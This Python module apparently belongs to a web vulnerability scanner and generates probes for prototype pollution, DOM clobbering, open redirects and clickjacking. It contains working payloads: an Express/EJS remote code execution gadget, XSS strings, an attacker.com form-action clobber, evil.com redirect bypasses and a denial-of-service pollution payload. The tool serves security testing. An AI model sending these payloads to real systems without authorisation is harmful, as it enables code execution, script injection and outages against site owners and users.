"""prototype_pollution: Payload generation."""
from __future__ import annotations

import copy
import urllib.parse
import uuid
from typing import List

from argus.collectors.prototype_pollution.models import GadgetFramework, PrototypePollutionMutationStrategy, PrototypePollutionProbe, PrototypePollutionVulnerabilityType


class PrototypePollutionPayloadGenerator:
    """
    Generates tailored prototype pollution, DOM clobbering, open redirect,
    clickjacking, and framework gadget probe requests with mutation strategies.
    """

    SENSITIVE_PATHS = [
        "/login",
        "/admin",
        "/settings",
        "/account",
        "/profile",
        "/payment",
        "/checkout",
        "/change-password",
        "/transfer",
        "/dashboard",
    ]

    REDIRECT_PARAMS = [
        "url",
        "next",
        "redirect",
        "return_to",
        "continue",
        "dest",
        "destination",
        "redir",
        "r",
        "target",
        "forward",
        "goto",
    ]

    def __init__(self):
        pass

    def generate_all_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates comprehensive test probes across all vectors and mutation strategies."""
        probes: List[PrototypePollutionProbe] = []
        probes.extend(self.generate_benign_baseline_probes(endpoint_url))
        probes.extend(self.generate_server_side_pp_probes(endpoint_url))
        probes.extend(self.generate_client_side_pp_probes(endpoint_url))
        probes.extend(self.generate_dom_clobbering_probes(endpoint_url))
        probes.extend(self.generate_open_redirect_probes(endpoint_url))
        probes.extend(self.generate_clickjacking_probes(endpoint_url))
        probes.extend(self.generate_gadget_chain_probes(endpoint_url))
        probes.extend(self.generate_evasion_probes(endpoint_url))
        return probes

    def generate_benign_baseline_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates clean baseline probes to establish normal behavior and prevent false positives."""
        return [
            PrototypePollutionProbe(
                probe_id=f"baseline_get_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                is_benign_baseline=True,
                metadata={"purpose": "benign_get_baseline"},
            ),
            PrototypePollutionProbe(
                probe_id=f"baseline_post_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                json_data={"argus_test": "baseline_probe", "active": True},
                is_benign_baseline=True,
                metadata={"purpose": "benign_post_baseline"},
            ),
        ]

    def generate_server_side_pp_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates server-side prototype pollution JSON body injection probes."""
        probes: List[PrototypePollutionProbe] = []
        token = uuid.uuid4().hex[:8]
        canary_prop = f"argus_polluted_{token}"
        canary_val = f"polluted_val_{token}"

        # 1. Direct __proto__ JSON injection
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"proto_direct_{token[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.SERVER_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data={"__proto__": {canary_prop: canary_val}},
                canary_property=canary_prop,
                canary_value=canary_val,
                tested_parameter="__proto__",
                metadata={"description": "Direct __proto__ JSON injection"},
            )
        )

        # 2. constructor.prototype JSON injection
        token2 = uuid.uuid4().hex[:8]
        canary_prop2 = f"argus_proto_check_{token2}"
        canary_val2 = f"val_{token2}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"proto_constructor_{token2[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.SERVER_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data={"constructor": {"prototype": {canary_prop2: canary_val2}}},
                canary_property=canary_prop2,
                canary_value=canary_val2,
                tested_parameter="constructor.prototype",
                metadata={"description": "constructor.prototype JSON injection"},
            )
        )

        # 3. Nested property traversal depth probes (depth 3-5)
        token3 = uuid.uuid4().hex[:8]
        canary_prop3 = f"argus_nested_{token3}"
        canary_val3 = f"nested_val_{token3}"
        nested_json = {
            "level1": {
                "level2": {
                    "level3": {
                        "__proto__": {canary_prop3: canary_val3}
                    }
                }
            }
        }
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"proto_nested_depth_{token3[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.SERVER_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data=nested_json,
                canary_property=canary_prop3,
                canary_value=canary_val3,
                tested_parameter="level1.level2.level3.__proto__",
                depth=4,
                metadata={"description": "Deep nested property traversal prototype pollution"},
            )
        )

        return probes

    def generate_client_side_pp_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates client-side prototype pollution probes via query/hash gadgets."""
        probes: List[PrototypePollutionProbe] = []
        token = uuid.uuid4().hex[:8]
        canary_prop = f"argus_dom_polluted_{token}"
        canary_val = f"dom_val_{token}"

        # 1. URL Query Bracket Notation
        parsed = urllib.parse.urlparse(endpoint_url)
        q_url = f"{endpoint_url}{'&' if parsed.query else '?'}__proto__[{canary_prop}]={canary_val}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"dom_proto_bracket_{token[:6]}",
                target_url=q_url,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.CLIENT_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                canary_property=canary_prop,
                canary_value=canary_val,
                tested_parameter=f"__proto__[{canary_prop}]",
                metadata={"description": "Client-side prototype pollution via URL query bracket gadget"},
            )
        )

        # 2. URL Query Dot Notation
        token2 = uuid.uuid4().hex[:8]
        canary_prop2 = f"argus_dom_dot_{token2}"
        canary_val2 = f"dot_val_{token2}"
        q_url2 = f"{endpoint_url}{'&' if parsed.query else '?'}__proto__.{canary_prop2}={canary_val2}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"dom_proto_dot_{token2[:6]}",
                target_url=q_url2,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.CLIENT_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                canary_property=canary_prop2,
                canary_value=canary_val2,
                tested_parameter=f"__proto__.{canary_prop2}",
                metadata={"description": "Client-side prototype pollution via URL query dot notation"},
            )
        )

        # 3. URL Hash Fragment Gadget
        token3 = uuid.uuid4().hex[:8]
        canary_prop3 = f"argus_hash_polluted_{token3}"
        canary_val3 = f"hash_val_{token3}"
        h_url = f"{endpoint_url}#__proto__[{canary_prop3}]={canary_val3}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"dom_proto_hash_{token3[:6]}",
                target_url=h_url,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.CLIENT_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                canary_property=canary_prop3,
                canary_value=canary_val3,
                tested_parameter="location.hash#__proto__",
                metadata={"description": "Client-side prototype pollution via location.hash fragment gadget"},
            )
        )

        # 4. Constructor Prototype Query Gadget
        token4 = uuid.uuid4().hex[:8]
        canary_prop4 = f"argus_ctor_prop_{token4}"
        canary_val4 = f"ctor_val_{token4}"
        q_url4 = f"{endpoint_url}{'&' if parsed.query else '?'}constructor[prototype][{canary_prop4}]={canary_val4}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"dom_proto_ctor_{token4[:6]}",
                target_url=q_url4,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.CLIENT_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                canary_property=canary_prop4,
                canary_value=canary_val4,
                tested_parameter=f"constructor[prototype][{canary_prop4}]",
                metadata={"description": "Client-side prototype pollution via constructor.prototype gadget"},
            )
        )

        return probes

    def generate_dom_clobbering_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates DOM clobbering probe payloads shadowing DOM API properties."""
        probes: List[PrototypePollutionProbe] = []

        # 1. Shadowing document.cookie (Logic corruption / medium)
        clobber_cookie_html = '<form id="cookie" name="cookie"><input id="value" value="clobbered_auth_state"></form>'
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"clobber_cookie_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.DOM_CLOBBERING,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                data={"html": clobber_cookie_html, "content": clobber_cookie_html, "comment": clobber_cookie_html},
                canary_property="document.cookie",
                canary_value=clobber_cookie_html,
                tested_parameter="form#cookie",
                metadata={"clobbered_target": "document.cookie", "severity": "medium", "impact": "logic_corruption"},
            )
        )

        # 2. Shadowing script src / href leading to DOM XSS (High severity)
        clobber_xss_html = '<a id="defaultAvatar" href="javascript:alert(1)">Click</a>'
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"clobber_xss_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.DOM_CLOBBERING,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                data={"html": clobber_xss_html, "content": clobber_xss_html, "body": clobber_xss_html},
                canary_property="a#defaultAvatar",
                canary_value=clobber_xss_html,
                tested_parameter="a#defaultAvatar",
                metadata={"clobbered_target": "a.href", "severity": "high", "impact": "xss"},
            )
        )

        # 3. Shadowing document.body / document.getElementById via named elements
        clobber_body_html = '<img id="body" name="body" src="x" onerror="alert(1)">'
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"clobber_body_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.DOM_CLOBBERING,
                strategy=PrototypePollutionMutationStrategy.DOM_CLOBBERING_VARIANTS,
                data={"payload": clobber_body_html, "input": clobber_body_html},
                canary_property="document.body",
                canary_value=clobber_body_html,
                tested_parameter="img#body",
                metadata={"clobbered_target": "document.body", "severity": "high", "impact": "xss"},
            )
        )

        # 4. Shadowing form.action / form attributes (Logic corruption)
        clobber_form_html = '<form id="form"><input id="action" value="https://attacker.com/steal"></form>'
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"clobber_form_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.DOM_CLOBBERING,
                strategy=PrototypePollutionMutationStrategy.DOM_CLOBBERING_VARIANTS,
                data={"html": clobber_form_html, "markup": clobber_form_html},
                canary_property="form.action",
                canary_value=clobber_form_html,
                tested_parameter="form#action",
                metadata={"clobbered_target": "form.action", "severity": "medium", "impact": "logic_corruption"},
            )
        )

        return probes

    def generate_open_redirect_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates open redirect probes covering parameter variations and encoding schemes."""
        probes: List[PrototypePollutionProbe] = []
        external_target = "https://evil.com/argus_redirect_target"

        for param in self.REDIRECT_PARAMS:
            parsed = urllib.parse.urlparse(endpoint_url)
            q_url = f"{endpoint_url}{'&' if parsed.query else '?'}{param}={urllib.parse.quote(external_target)}"
            probes.append(
                PrototypePollutionProbe(
                    probe_id=f"redir_{param}_{uuid.uuid4().hex[:6]}",
                    target_url=q_url,
                    method="GET",
                    vulnerability_type=PrototypePollutionVulnerabilityType.OPEN_REDIRECT,
                    strategy=PrototypePollutionMutationStrategy.STANDARD,
                    tested_parameter=param,
                    expected_redirect=external_target,
                    metadata={"param": param, "target": external_target, "technique": "direct_url"},
                )
            )

        # Multi-hop redirect chain probe
        hop_target = "https://evil.com/final_landing"
        parsed = urllib.parse.urlparse(endpoint_url)
        chain_url = f"{endpoint_url}{'&' if parsed.query else '?'}next={urllib.parse.quote('https://hop.example.com/step?url=' + urllib.parse.quote(hop_target))}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"redir_chain_{uuid.uuid4().hex[:6]}",
                target_url=chain_url,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.OPEN_REDIRECT,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                tested_parameter="next",
                expected_redirect=hop_target,
                metadata={"technique": "multi_hop_chain", "target": hop_target},
            )
        )

        return probes

    def generate_clickjacking_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates clickjacking / UI redressing security header audit probes for sensitive endpoints."""
        probes: List[PrototypePollutionProbe] = []
        parsed = urllib.parse.urlparse(endpoint_url)
        path = parsed.path or "/"

        # Only generate clickjacking probes on sensitive or main web pages
        is_sensitive = any(sensitive in path.lower() for sensitive in self.SENSITIVE_PATHS) or path in ("/", "")

        if is_sensitive:
            probes.append(
                PrototypePollutionProbe(
                    probe_id=f"clickjack_inspect_{uuid.uuid4().hex[:6]}",
                    target_url=endpoint_url,
                    method="GET",
                    vulnerability_type=PrototypePollutionVulnerabilityType.CLICKJACKING,
                    strategy=PrototypePollutionMutationStrategy.STANDARD,
                    tested_parameter="X-Frame-Options / CSP",
                    metadata={"path": path, "is_sensitive": True},
                )
            )

        return probes

    def generate_gadget_chain_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates framework-specific gadget chains and DoS/RCE payloads."""
        probes: List[PrototypePollutionProbe] = []

        # 1. Express framework gadgets
        express_payload = {
            "__proto__": {
                "settings": {
                    "view options": {
                        "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');"
                    }
                },
                "views": "/tmp",
                "view engine": "ejs",
                "trust proxy": True,
            }
        }
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"gadget_express_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.GADGET_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data=express_payload,
                framework_target=GadgetFramework.EXPRESS,
                canary_property="settings.view options",
                canary_value="ejs",
                tested_parameter="express_view_options",
                metadata={"framework": "express", "severity": "high"},
            )
        )

        # 2. Lodash framework gadgets
        lodash_payload = {
            "__proto__": {
                "templateSettings": {
                    "interpolate": "argus_lodash_interpolate_{{.*?}}",
                    "evaluate": "argus_lodash_eval",
                },
                "sourceURL": "\n/*argus_lodash_source*/",
            }
        }
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"gadget_lodash_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.GADGET_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data=lodash_payload,
                framework_target=GadgetFramework.LODASH,
                canary_property="templateSettings.interpolate",
                canary_value="argus_lodash_eval",
                tested_parameter="lodash_templateSettings",
                metadata={"framework": "lodash", "severity": "high"},
            )
        )

        # 3. Handlebars compiler gadget
        handlebars_payload = {
            "__proto__": {
                "compiler": {
                    "knownHelpers": {"blockHelperMissing": True},
                    "compat": True,
                }
            }
        }
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"gadget_handlebars_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.GADGET_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data=handlebars_payload,
                framework_target=GadgetFramework.HANDLEBARS,
                canary_property="compiler.knownHelpers",
                canary_value="compat",
                tested_parameter="handlebars_compiler",
                metadata={"framework": "handlebars", "severity": "high"},
            )
        )

        # 4. jQuery gadget
        jquery_payload = {
            "__proto__": {
                "htmlPrefilter": "<img src=x onerror=alert(1)>",
                "jQuery.support.boxModel": True,
            }
        }
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"gadget_jquery_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.GADGET_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data=jquery_payload,
                framework_target=GadgetFramework.JQUERY,
                canary_property="htmlPrefilter",
                canary_value="boxModel",
                tested_parameter="jquery_htmlPrefilter",
                metadata={"framework": "jquery", "severity": "high"},
            )
        )

        # 5. Node.js child_process.exec RCE Gadget (Critical Severity 9.8)
        rce_payload = {
            "__proto__": {
                "shell": "/bin/sh",
                "NODE_OPTIONS": "--inspect=0.0.0.0:9229",
                "execPath": "/bin/sh",
                "argv0": "node",
            }
        }
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"gadget_rce_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.RCE_GADGET,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data=rce_payload,
                framework_target=GadgetFramework.NODEJS_CHILD_PROCESS,
                canary_property="NODE_OPTIONS",
                canary_value="/bin/sh",
                tested_parameter="child_process.exec",
                metadata={"framework": "nodejs_child_process", "severity": "critical"},
            )
        )

        # 6. Denial of Service via toString / valueOf pollution
        dos_payload = {
            "__proto__": {
                "toString": None,
                "valueOf": 12345,
            }
        }
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"gadget_dos_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.DOS_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.STANDARD,
                json_data=dos_payload,
                framework_target=GadgetFramework.GENERIC,
                canary_property="toString",
                canary_value="null",
                tested_parameter="Object.prototype.toString",
                metadata={"severity": "high", "impact": "denial_of_service"},
            )
        )

        return probes

    def generate_evasion_probes(self, endpoint_url: str) -> List[PrototypePollutionProbe]:
        """Generates probes using the 5 mandatory mutation/evasion strategies."""
        probes: List[PrototypePollutionProbe] = []

        # Strategy 1: JSON Key Encoding Variations
        token1 = uuid.uuid4().hex[:8]
        canary1 = f"argus_enc_{token1}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"evasion_key_enc_{token1[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.SERVER_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.JSON_KEY_ENCODING,
                json_data={"\\u005f\\u005fproto\\u005f\\u005f": {canary1: f"val_{token1}"}},
                canary_property=canary1,
                canary_value=f"val_{token1}",
                tested_parameter="\\u005f\\u005fproto\\u005f\\u005f",
                metadata={"evasion": "unicode_json_key_encoding"},
            )
        )

        # Strategy 2: Content-Type Manipulation (form-urlencoded / multipart)
        token2 = uuid.uuid4().hex[:8]
        canary2 = f"argus_ctype_{token2}"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"evasion_ctype_{token2[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.SERVER_SIDE_PROTOTYPE_POLLUTION,
                strategy=PrototypePollutionMutationStrategy.CONTENT_TYPE_MANIPULATION,
                content_type="application/x-www-form-urlencoded",
                data=f"__proto__[{canary2}]=form_val_{token2}&__proto__.{canary2}=form_val_{token2}",
                canary_property=canary2,
                canary_value=f"form_val_{token2}",
                tested_parameter="form_body.__proto__",
                metadata={"evasion": "content_type_manipulation"},
            )
        )

        # Strategy 3: Redirect URL Encoding Layers (double encode, unicode fullwidth, scheme-relative, @ authority)
        parsed = urllib.parse.urlparse(endpoint_url)
        # Scheme-relative //evil.com
        scheme_rel_url = f"{endpoint_url}{'&' if parsed.query else '?'}redirect=//evil.com/scheme_relative"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"evasion_redir_scheme_{uuid.uuid4().hex[:6]}",
                target_url=scheme_rel_url,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.OPEN_REDIRECT,
                strategy=PrototypePollutionMutationStrategy.REDIRECT_URL_ENCODING,
                tested_parameter="redirect",
                expected_redirect="//evil.com/scheme_relative",
                metadata={"evasion": "scheme_relative_url"},
            )
        )
        # Authority @ bypass
        auth_url = f"{endpoint_url}{'&' if parsed.query else '?'}url=https://target.example.com@evil.com/auth_bypass"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"evasion_redir_auth_{uuid.uuid4().hex[:6]}",
                target_url=auth_url,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.OPEN_REDIRECT,
                strategy=PrototypePollutionMutationStrategy.REDIRECT_URL_ENCODING,
                tested_parameter="url",
                expected_redirect="https://target.example.com@evil.com/auth_bypass",
                metadata={"evasion": "authority_at_bypass"},
            )
        )
        # Double URL encoding
        double_enc_url = f"{endpoint_url}{'&' if parsed.query else '?'}next=https:%252f%252fevil.com"
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"evasion_redir_double_{uuid.uuid4().hex[:6]}",
                target_url=double_enc_url,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.OPEN_REDIRECT,
                strategy=PrototypePollutionMutationStrategy.REDIRECT_URL_ENCODING,
                tested_parameter="next",
                expected_redirect="https://evil.com",
                metadata={"evasion": "double_url_encoding"},
            )
        )

        # Strategy 4: DOM Clobbering Variants (object, embed, nested forms)
        clobber_embed_html = '<object id="document" data="https://evil.com/exploit.swf"></object>'
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"evasion_dom_variant_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="POST",
                vulnerability_type=PrototypePollutionVulnerabilityType.DOM_CLOBBERING,
                strategy=PrototypePollutionMutationStrategy.DOM_CLOBBERING_VARIANTS,
                data={"content": clobber_embed_html},
                canary_property="object#document",
                canary_value=clobber_embed_html,
                tested_parameter="object#document",
                metadata={"evasion": "object_embed_clobbering", "severity": "high"},
            )
        )

        # Strategy 5: Frame-Busting Bypass Techniques (sandbox, double framing)
        probes.append(
            PrototypePollutionProbe(
                probe_id=f"evasion_frame_bypass_{uuid.uuid4().hex[:6]}",
                target_url=endpoint_url,
                method="GET",
                vulnerability_type=PrototypePollutionVulnerabilityType.CLICKJACKING,
                strategy=PrototypePollutionMutationStrategy.FRAME_BUSTING_BYPASS,
                tested_parameter="iframe_sandbox_bypass",
                metadata={"evasion": "sandbox_attribute_framing", "severity": "medium"},
            )
        )

        return probes

    def apply_mutation(
        self,
        probe: PrototypePollutionProbe,
        strategy: PrototypePollutionMutationStrategy,
    ) -> PrototypePollutionProbe:
        """Applies a specified mutation/evasion strategy to an existing probe."""
        new_probe = copy.deepcopy(probe)
        new_probe.strategy = strategy
        new_probe.probe_id = f"{probe.probe_id}_mut_{strategy.value[:4]}"

        if strategy == PrototypePollutionMutationStrategy.JSON_KEY_ENCODING:
            if new_probe.json_data and isinstance(new_probe.json_data, dict):
                mutated_json = {}
                for k, v in new_probe.json_data.items():
                    if k == "__proto__":
                        mutated_json["\\u005f\\u005fproto\\u005f\\u005f"] = v
                    elif k == "constructor":
                        mutated_json['constructor["prototype"]'] = v
                    else:
                        mutated_json[k] = v
                new_probe.json_data = mutated_json

        elif strategy == PrototypePollutionMutationStrategy.CONTENT_TYPE_MANIPULATION:
            new_probe.content_type = "application/x-www-form-urlencoded"
            if new_probe.json_data and isinstance(new_probe.json_data, dict):
                # Flatten JSON to form-urlencoded parameters
                params_list = []
                for k, v in new_probe.json_data.items():
                    if isinstance(v, dict):
                        for sub_k, sub_v in v.items():
                            params_list.append(f"{k}[{sub_k}]={sub_v}")
                    else:
                        params_list.append(f"{k}={v}")
                new_probe.data = "&".join(params_list)
                new_probe.json_data = None

        elif strategy == PrototypePollutionMutationStrategy.REDIRECT_URL_ENCODING:
            if new_probe.target_url:
                parsed = urllib.parse.urlparse(new_probe.target_url)
                if "evil.com" in new_probe.target_url:
                    # Switch to double-encoded or scheme-relative
                    new_url = new_probe.target_url.replace("https://evil.com", "//evil.com")
                    new_probe.target_url = new_url

        elif strategy == PrototypePollutionMutationStrategy.DOM_CLOBBERING_VARIANTS:
            if new_probe.data and isinstance(new_probe.data, dict):
                # Switch form to anchor or object variant
                for k in new_probe.data:
                    if "<form" in str(new_probe.data[k]):
                        new_probe.data[k] = '<a id="cookie" name="cookie" href="javascript:alert(1)">Clobbered</a>'

        elif strategy == PrototypePollutionMutationStrategy.FRAME_BUSTING_BYPASS:
            new_probe.metadata["frame_sandbox"] = "allow-forms allow-scripts"

        return new_probe
